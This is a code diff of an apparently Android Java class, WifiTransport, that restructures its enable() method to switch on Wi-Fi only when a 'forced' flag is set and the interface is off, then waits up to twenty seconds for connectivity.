@@ -87,28 +87,43 @@ public class WifiTransport extends HttpKeepAliveTransport {
 			Check.log(TAG + " (enable): forced: " + forced + " wifiState: " + wifi.getWifiState()); //$NON-NLS-1$
 		}
 
+		if (forced == false) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (enable): wifi connectivity won't be forced, force flag is disabled"); //$NON-NLS-1$
+			}
+			
+			return;
+		}
+		
 		// wifi.reconnect();
 		// wifi.reassociate();
 		// ConnectivityManager.setNetworkPrefrence(ConnectivityManager.TYPE_WIFI)
-		if (forced && wifi.getWifiState() != WifiManager.WIFI_STATE_ENABLING) {
+		if (wifi.getWifiState() == WifiManager.WIFI_STATE_ENABLED || wifi.getWifiState() == WifiManager.WIFI_STATE_ENABLING) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (enable): trying to enable wifi");//$NON-NLS-1$
+				Check.log(TAG + " (enable): wifi already on, forcing not required"); //$NON-NLS-1$
 			}
 
-			switchedOn = wifi.setWifiEnabled(true);
+			return;
+		}
 
-			if (switchedOn == false) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (enable): cannot enable WiFi interface"); //$NON-NLS-1$
-				}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (enable): trying to enable wifi");//$NON-NLS-1$
+		}
+
+		switchedOn = wifi.setWifiEnabled(true);
+
+		if (switchedOn == false) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (enable): cannot enable WiFi interface"); //$NON-NLS-1$
+			}
+		}
+
+		for (int i = 0; i < 20; i++) {
+			if (isAvailable()) {
+				break;
 			}
 
-			for (int i = 0; i < 20; i++) {
-				if (isAvailable()) {
-					break;
-				}
-				Utils.sleep(1000);
-			}
+			Utils.sleep(1000);
 		}
 	}
 
